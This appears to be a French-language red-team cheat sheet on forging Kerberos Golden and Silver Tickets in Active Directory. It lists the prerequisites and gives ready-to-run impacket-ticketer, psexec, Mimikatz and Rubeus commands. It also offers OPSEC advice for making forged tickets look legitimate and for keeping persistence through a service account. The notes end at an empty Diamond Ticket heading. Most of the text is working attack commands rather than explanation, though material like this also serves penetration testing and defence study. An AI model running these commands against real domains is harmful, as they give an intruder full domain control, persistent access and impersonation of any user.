

- [[#Golden Ticket]]
- [[#Silver Ticket]]


# Golden Ticket

> [!TIP]
> Forger un ticket Kerberos avec une validité de 10 ans

Pour performer cette attaque, besoin des éléments suivants:

- The KRBTGT hash for domain (préférer la clé AES au hash NT)
- The SID for the domain
- The name of a target user in the domain
- The FQDN of the domain.

## Linux

### Impacket

Forger le ticket

```sh
impacket-ticketer -aesKey <hash_krbtgt> -domain-sid <SID> -domain <domain.local> <target_user>
```

Injecter le ticket

```
export KRB5CCNAME=<target_user>.ccache
```

Pass the ticket (psexec ou wmiexec)

```
impacket-psexec jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```


## Windows

### Mimikatz

```
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```

### Rubeus

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```




---
# Silver Ticket

Forger un ticket de service. 

> [!Attention]
> Forger un ticket de service. Le mot de passe du compte d'ordinateur est modifié automatiquement tous les 30 jours par défaut.
> Peut être utile pour avoir une persistence avec un compte admin MSSQL par exemple.
> Pas possible à réaliser si la validation du PAC est activé sur les ordinateurs. (Devrait être activé par défaut depuis le Patch Tuesday d'avril 2025).
> S'assurer de mettre le nom de Domaine en MAJ (peut paraitre plus légitime vis à vis de l'OPSEC).
> Alternative plus OPSEC et non patché -> [[3. Comptes de service - Comptes de machine#S4U2Self|S4U2SELF]]

Utile pour usurper n'importe quel user sur le service.


Pour performer cette attaque, besoin des éléments suivants:

- Hash du compte de service cible
- Service cible
- Domain
- SID du domaine

## Linux

### Impacket

```sh
impacket-ticketer -spn "MSSQLSvc/target.domain.local" -nthash <hashnt_compte_service> -domain-sid <SID> -domain <domain.local> -user-id <rid_compte_de_svc> -groups 512,<rid_groupe_adm_svc> <user>
```

## Windows

### Rubeus

```
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:<hash_compte_machine_cible> /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```




---

# Diamond Ticket

